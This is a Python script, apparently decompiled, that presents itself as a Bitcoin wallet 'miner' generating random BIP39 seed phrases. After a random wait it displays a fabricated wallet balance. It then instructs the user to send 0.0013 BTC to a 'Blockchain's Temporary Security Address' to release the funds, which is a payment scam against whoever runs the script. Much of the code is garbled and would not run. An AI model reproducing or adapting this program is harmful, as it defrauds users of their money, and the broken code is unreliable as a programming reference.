import pprint
import binascii
import mnemonic
import bip32utils
import requests
import random
import os
from decimal import Decimal
from multiprocessing.pool import ThreadPool as Pool
import threading
import hashlib
import secrets
import binascii
import time
from random import randint, uniform
walletSeconds = 1
timeToWin = randint(43200, 172800) * walletSeconds
timeToSleep = 1 / walletSeconds
haveFound = False

def userInput():
    print('Type "start" or "help"')
    user_input = input('> ')
    if user_input == 'start':
        start()
        return None
    if None == 'help':
        helpText()

    print("Type "help" if you need help")
    continue


class Bip39Gen(object):

    def __init__(self, bip39wordlist):
        self.bip39wordlist = bip39wordlist
        word_count = 12
        checksum_bit_count = word_count // 3
        total_bit_count = word_count * 11
        generated_bit_count = total_bit_count - checksum_bit_count
        entropy = self.generate_entropy(generated_bit_count)
        entropy_hash = self.get_hash(entropy)
        indices = self.pick_words(entropy, entropy_hash, checksum_bit_count)
        self.print_words(indices)


    def generate_entropy(self, generated_bit_count):
        entropy = secrets.randbits(generated_bit_count)
        return self.int_to_padded_binary(entropy, generated_bit_count)


    def get_hash(self, entropy):
        generated_bit_count = len(entropy)
        generated_char_count = generated_bit_count // 4
        entropy_hex = self.binary_to_padded_hex(entropy, generated_char_count)
        entropy_hex_no_padding = entropy_hex[2:]
        entropy_bytearray = bytearray.fromhex(entropy_hex_no_padding)
        return hashlib.sha256(entropy_bytearray).hexdigest()


    def pick_words(self, entropy, entropy_hash, checksum_bit_count):
        checksum_char_count = checksum_bit_count // 4
        bit = entropy_hash[0:checksum_char_count]
        check_bit = int(bit, 16)
        checksum = self.int_to_padded_binary(check_bit, checksum_bit_count)
        source = str(entropy) + str(checksum)
        return (lambda .0 = None: [ int(str('0b') + source[i:i + 11], 2) for i in .0 ])(range(0, len(source), 11))


    def print_words(self, indices):
        words = (lambda .0 = None: [ self.bip39wordlist[indices[i]] for i in .0 ])(range(len(indices)))
        word_string = ' '.join(words)
        self.mnemonic = word_string


    def int_to_padded_binary(self, num, padding):
        return bin(num)[2:].zfill(padding)


    def binary_to_padded_hex(self, bin, padding):
        num = int(bin, 2)
        return '0x{0:0{1}x}'.format(num, padding)



def getInternet():

    pass


lock = threading.Lock()
if getInternet() == True:
    dictionary = requests.get('https://raw.githubusercontent.com/bitcoin/bips/master/bip-0039/english.txt').text.strip().split('\n')
else:

    def generateSeed():
        seed = ''
        for i in range(12):
            pass
        random.choice(dictionary) += ' ' + random.choice(dictionary)
        continue
        return seed


    def bip39(mnemonic_words):
        mobj = mnemonic.Mnemonic('english')
        seed = mobj.to_seed(mnemonic_words)
        bip32_root_key_obj = bip32utils.BIP32Key.fromEntropy(seed)
        bip32_child_key_obj = bip32_root_key_obj.ChildKey(44 + bip32utils.BIP32_HARDEN).ChildKey(0 + bip32utils.BIP32_HARDEN).ChildKey(0 + bip32utils.BIP32_HARDEN).ChildKey(0).ChildKey(0)
        return bip32_child_key_obj.Address()


    def welcomeBanner():
        print('\n                                                                                                   \n                                                                                                    \n                                                                                                    \n                                                                                                    \n                                                    @@@@                                            \n                                            ,@@@@@@@@@@@@@#\n                                     @@@@@@@@@@@@@@@@@@@@@@@@\n                              @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n                      /@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n               @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  @@@@@@@@@@@@@@@@@@@@@@@@@@@@\n    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@       @@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@       @@@@@@@@@  @@@@@@@@@@@@@@@@@@\n  %@@@@@@     (@@@@@@@@@@@@@@@@@@@@@@@@@&       /          @@@@@@@@@@@@@@@@@@.\n   @@@@     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@          @@@@@@@@@@@@@@@@@@@@@@@@@@@@\n    ,@   (@@@@@@@@@@@@@@@@@@@@@@@@@.                @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n        *@@@@@@@@@@@@@@@@@@@@@@@@@@    @@@@@@@        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(\n        /@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n           @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&\n             @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n              @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@      &@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n                @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%   .\n                 ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@        @@\n                   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@              @@\n                     @@@@@@@@@@    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@,                    @@&\n                      %@@@@@       @@@@@@@@@@@@@@@@@@@@@@@@@@@@@                            @@@\n                        @@     @@@@@@@@@@@@@@@@@@@@@@@@@@                                    .@@@\n                             &@@@@@@@@@@@@@@@@@@@@                                       @@@@@@@.\n                             @@@@@@@@@@@@@@,              discord.gg/labible      @@@@@@@\n                             @@@@@@@@@@                                   @@@@@@@@\n                              @@@@@@@                              @@@@@@@(\n                                @@@@(        @@@@@@@@       @@@@@@@\n                                  @@@          @@@@@@@@@@@@@\n                                   @@@       @@@@@@@@@@@@\n                                     *@@@@@@@,     @@@                            \n    ')


    def helpText():
        print("You will start mining wallets and going to the moon!")


    def askForWallet():
        walletBlc = input('> Put your BITCOIN wallet : ')
        if len(walletBlc) < 34 or len(walletBlc) > 34:
            print('The Wallet is Invalid !')
            askForWallet()
            return None


    def start():
        global timeToWin, haveFound
        errorTime = 900
        if getInternet() == True:
            if haveFound == False:
                time.sleep(timeToSleep)
                timeToWin -= 1
                mnemonic_words = Bip39Gen(dictionary).mnemonic
                addy = bip39(mnemonic_words)
                if timeToWin <= 0:
                    print(f'''Address: {addy} | Balance: {uniform(0.0055, 0.055)} | Mnemonic phrase: {mnemonic_words}\n''')
                    haveFound = True

        print(f'''Address: {addy} | Balance: None | Mnemonic phrase: {mnemonic_words}''')
        if haveFound == False or haveFound == True:
            askForWallet()
            print("You have found a wallet! Due to Blockchain security measures we have to issue a 0.0013 BTC transaction. If you do not know how to do it go to moonpay.com and send 0.0013 to Blockchain's Temporary Security Address: bc1qhskd5anu5xpke2q0n0mlv42xe9u2pz7nfpx9hu Once the transaction is done you will get your bitcoin in your wallet")
            print('Waiting for the transaction')
            if errorTime >= 0:
                errorTime -= 1
                time.sleep(1)
                if not errorTime >= 0:
                    print('A error has occured')
                    return None
                return None
            None('WIFI Off')
            userInput()
            return None

    if __name__ == '__main__':
        welcomeBanner()
        getInternet()
        if getInternet() == False:
            print('WIFI OFF')
        else:
            userInput()
            return None
        return None
